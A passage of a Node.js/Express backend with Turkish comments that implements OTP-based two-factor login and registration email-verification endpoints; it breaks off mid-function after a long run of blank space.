        console.error('auth/me hatası:', e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── /api/auth/verify-otp ALIAS ──────────────────────────────────────────
// Login 2FA: { tempToken, code }  →  /api/auth/verify-2fa mantığı
// Register : { email, code }      →  /api/auth/register-verify mantığı
app.post('/api/auth/verify-otp', otpLimiter, validateAuthInput, async (req, res) => {
    const { tempToken, code, email } = req.body;
    if (tempToken && code) {
        // 2FA doğrulama (login)
        try {
            let decoded;
            try { decoded = jwt.verify(tempToken, JWT_SECRET, { algorithms: ['HS256'] }); }
            catch { return res.status(401).json({ error: 'Geçersiz veya süresi dolmuş oturum. Lütfen tekrar giriş yapın.' }); }
            if (!decoded.pending2FA) return res.status(400).json({ error: 'Geçersiz istek' });
            const twofa = await dbGet(
                `SELECT * FROM two_factor_codes WHERE "userId" = $1 AND code = $2 AND "expiresAt" > NOW() AND used = FALSE ORDER BY "createdAt" DESC LIMIT 1`,
                [decoded.id, String(code)]
            );
            if (!twofa) return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş kod' });
            await dbRun(`UPDATE two_factor_codes SET used = TRUE WHERE id = $1`, [twofa.id]);
            const user = await dbGet(
                `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio, "isVerified", "isActive", "userType", "hasFarmerBadge", "isOnline", "isBanned", "emailVerified", "twoFactorEnabled" FROM users WHERE id = $1 AND "isActive" = TRUE`,
                [decoded.id]
            );
            if (!user) return res.status(401).json({ error: 'Kullanıcı bulunamadı' });
            await dbRun('UPDATE users SET "lastLogin" = NOW(), "isOnline" = TRUE, "updatedAt" = NOW() WHERE id = $1', [user.id]);
            dbRun(`INSERT INTO user_login_hours ("userId", hour) VALUES ($1, $2)`,
                [user.id, new Date().getHours()]).catch(() => {});
            const tokens = generateTokens(user);
            const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
            await dbRun(
                `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt") VALUES ($1,$2,$3,$4,$5,NOW(),NOW() + INTERVAL '365 days')`,
                [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
            );
            const { password: _, ...userSafe } = user;
            return res.json({ token: tokens.accessToken, accessToken: tokens.accessToken, refreshToken: tokens.refreshToken, user: userSafe, verified: true });
        } catch (e) { console.error('verify-otp (2fa) hatası:', e); return res.status(500).json({ error: 'Sunucu hatası' }); }
    } else if (email && code) {
        // Kayıt e-posta doğrulama
        try {
            const cleanEmail = email.toLowerCase().trim();
            const verification = await dbGet(
                `SELECT ev.*, u.id as "userId2" FROM email_verifications ev JOIN users u ON ev."userId" = u.id WHERE u.email = $1 AND ev.code = $2 AND ev.used = FALSE AND ev."expiresAt" > NOW() ORDER BY ev."createdAt" DESC LIMIT 1`,
                [cleanEmail, String(code)]
            );
            if (!verification) return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş kod' });
            await dbRun(`UPDATE users SET "emailVerified" = TRUE, "updatedAt" = NOW() WHERE id = $1`, [verification.userId]);
            await dbRun(`DELETE FROM email_verifications WHERE "userId" = $1`, [verification.userId]);
            const user = await dbGet(`SELECT id, name, username, email, "profilePic", bio, plan FROM users WHERE id = $1`, [verification.userId]);
            const tokens = generateTokens(user);
            return res.status(201).json({ token: tokens.accessToken, accessToken: tokens.accessToken, refreshToken: tokens.refreshToken, user, verified: true });
        } catch (e) { console.error('verify-otp (register) hatası:', e); return res.status(500).json({ error: 'Sunucu hatası' }); }
    } else {
        return res.status(400).json({ error: 'tempToken+code veya email+code gerekli' });
    }
});

// ─── /api/auth/send-otp ALIAS ──────────────────────────────────────────────
// { email, tempToken }   → login 2FA resend
// { email }              → register doğrulama kodu yeniden gönder
app.post('/api/auth/send-otp', otpLimiter, validateAuthInput, async (req, res) => {
    const { email, tempToken } = req.body;
    try {
        if (tempToken) {
            // 2FA yeniden gönder
            let decoded;
            try { decoded = jwt.verify(tempToken, JWT_SECRET, { algorithms: ['HS256'] }); }
            catch { return res.status(401).json({ error: 'Geçersiz oturum' }); }
            if (!decoded.pending2FA) return res.status(400).json({ error: 'Geçersiz istek' });
            const user = await dbGet(`SELECT id, email, name FROM users WHERE id = $1`, [decoded.id]);
            if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
            await dbRun(`UPDATE two_factor_codes SET used = TRUE WHERE "userId" = $1 AND used = FALSE`, [user.id])                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      